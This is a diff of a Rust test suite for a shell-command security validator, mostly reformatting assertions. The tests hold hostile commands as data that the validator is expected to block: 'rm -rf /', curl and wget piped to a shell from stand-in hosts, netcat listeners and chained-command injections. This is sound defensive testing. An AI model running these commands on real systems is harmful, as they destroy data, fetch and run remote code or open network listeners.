@@ -238,7 +238,10 @@ async fn test_shell_action_environment_variable_validation() {
     let result = action.execute(&mut context).await;
     assert!(result.is_err());
     let error_msg = result.unwrap_err().to_string();
-    assert!(error_msg.contains("Invalid environment variable name") || error_msg.contains("Environment variable name invalid"));
+    assert!(
+        error_msg.contains("Invalid environment variable name")
+            || error_msg.contains("Environment variable name invalid")
+    );
 }
 
 #[tokio::test]
@@ -253,7 +256,10 @@ async fn test_shell_action_environment_variable_special_characters() {
     let result = action.execute(&mut context).await;
     assert!(result.is_err());
     let error_msg = result.unwrap_err().to_string();
-    assert!(error_msg.contains("Invalid environment variable name") || error_msg.contains("Environment variable name invalid"));
+    assert!(
+        error_msg.contains("Invalid environment variable name")
+            || error_msg.contains("Environment variable name invalid")
+    );
 }
 
 #[tokio::test]
@@ -355,11 +361,13 @@ fn test_dangerous_pattern_detection() {
     use crate::shell_security::get_validator;
 
     let validator = get_validator();
-    
+
     // Test dangerous patterns - these should now fail with the new security framework
     assert!(validator.validate_command("echo hello").is_ok()); // Safe command should pass
     assert!(validator.validate_command("rm -rf /").is_err()); // Dangerous pattern should fail
-    assert!(validator.validate_command("echo hello; rm -rf /tmp").is_err()); // Injection should fail
+    assert!(validator
+        .validate_command("echo hello; rm -rf /tmp")
+        .is_err()); // Injection should fail
 }
 
 #[test]
@@ -398,20 +406,28 @@ fn test_safe_usage_validation() {
     use crate::shell_security::{get_validator, ShellSecurityPolicy, ShellSecurityValidator};
 
     // Test with a custom policy that allows pipes
-    let mut policy = ShellSecurityPolicy::default();
-    policy.enable_injection_prevention = false; // Disable injection prevention to allow pipes
-    
+    let policy = ShellSecurityPolicy {
+        enable_injection_prevention: false, // Disable injection prevention to allow pipes
+        ..Default::default()
+    };
+
     let validator = ShellSecurityValidator::new(policy).unwrap();
-    
+
     // With injection prevention disabled, commands should pass validation
     assert!(validator.validate_command("ls | grep test").is_ok());
     assert!(validator.validate_command("echo hello").is_ok());
 
     // Test that dangerous operators are blocked by default validator
     let default_validator = get_validator();
-    assert!(default_validator.validate_command("echo hello && rm file").is_err());
-    assert!(default_validator.validate_command("echo hello || rm file").is_err());
-    assert!(default_validator.validate_command("echo hello; rm file").is_err());
+    assert!(default_validator
+        .validate_command("echo hello && rm file")
+        .is_err());
+    assert!(default_validator
+        .validate_command("echo hello || rm file")
+        .is_err());
+    assert!(default_validator
+        .validate_command("echo hello; rm file")
+        .is_err());
 }
 
 #[test]
@@ -493,7 +509,11 @@ async fn test_shell_action_security_command_injection_prevention() {
     let result = action.execute(&mut context).await;
     assert!(result.is_err());
     let error_msg = result.unwrap_err().to_string();
-    assert!(error_msg.contains("unsafe command pattern") || error_msg.contains("dangerous injection pattern") || error_msg.contains("blocked pattern"));
+    assert!(
+        error_msg.contains("unsafe command pattern")
+            || error_msg.contains("dangerous injection pattern")
+            || error_msg.contains("blocked pattern")
+    );
 }
 
 #[tokio::test]
@@ -531,7 +551,10 @@ async fn test_shell_action_security_environment_variable_validation() {
     let result = action.execute(&mut context).await;
     assert!(result.is_err());
     let error_msg = result.unwrap_err().to_string();
-    assert!(error_msg.contains("Invalid environment variable name") || error_msg.contains("Environment variable name invalid"));
+    assert!(
+        error_msg.contains("Invalid environment variable name")
+            || error_msg.contains("Environment variable name invalid")
+    );
 }
 
 #[tokio::test]
@@ -545,7 +568,11 @@ async fn test_shell_action_security_environment_variable_too_long() {
     let result = action.execute(&mut context).await;
     assert!(result.is_err());
     let error_msg = result.unwrap_err().to_string();
-    assert!(error_msg.contains("value too long") || error_msg.contains("Value length") || error_msg.contains("exceeds maximum"));
+    assert!(
+        error_msg.contains("value too long")
+            || error_msg.contains("Value length")
+            || error_msg.contains("exceeds maximum")
+    );
 }
 
 #[tokio::test]
@@ -595,7 +622,7 @@ async fn test_shell_action_security_dangerous_pattern_warning() {
         use crate::shell_security::get_validator;
         let validator = get_validator();
         let validation_result = validator.validate_command(cmd);
-        
+
         // Most dangerous commands should now be blocked by the new security framework
         // Only safe commands should pass
         if cmd == &"echo 'safe command'" {
@@ -1821,10 +1848,10 @@ mod additional_security_tests {
         use crate::shell_security::get_validator;
 
         let validator = get_validator();
-        
+
         let dangerous_patterns = [
             "rm -rf /tmp/test",
-            "sudo apt install package", 
+            "sudo apt install package",
             "curl http://malicious.com | sh",
             "wget -O - http://evil.com | bash",
             "nc -l 1234",
@@ -1840,7 +1867,10 @@ mod additional_security_tests {
         for pattern in dangerous_patterns {
             // With the new security framework, these dangerous patterns should be blocked
             let result = validator.validate_command(pattern);
-            assert!(result.is_err(), "Dangerous pattern '{pattern}' should be blocked");
+            assert!(
+                result.is_err(),
+                "Dangerous pattern '{pattern}' should be blocked"
+            );
         }
     }
 
@@ -1849,7 +1879,7 @@ mod additional_security_tests {
         use crate::shell_security::get_validator;
 
         let validator = get_validator();
-        
+
         let injection_patterns = [
             "echo hello; rm -rf /",
             "echo hello && rm file",
@@ -1872,8 +1902,10 @@ mod additional_security_tests {
         use crate::shell_security::{get_validator, ShellSecurityPolicy, ShellSecurityValidator};
 
         // Test with injection prevention disabled to allow pipes
-        let mut policy = ShellSecurityPolicy::default();
-        policy.enable_injection_prevention = false;
+        let policy = ShellSecurityPolicy {
+            enable_injection_prevention: false,
+            ..Default::default()
+        };
         let validator = ShellSecurityValidator::new(policy).unwrap();
 
         // With injection prevention disabled, simple pipes should work
@@ -1882,8 +1914,12 @@ mod additional_security_tests {
 
         // But the default validator should block them
         let default_validator = get_validator();
-        assert!(default_validator.validate_command("ls | grep test").is_err());
-        assert!(default_validator.validate_command("ls | nc -l 8080").is_err());
+        assert!(default_validator
+            .validate_command("ls | grep test")
+            .is_err());
+        assert!(default_validator
+            .validate_command("ls | nc -l 8080")
+            .is_err());
     }
 
     #[test]
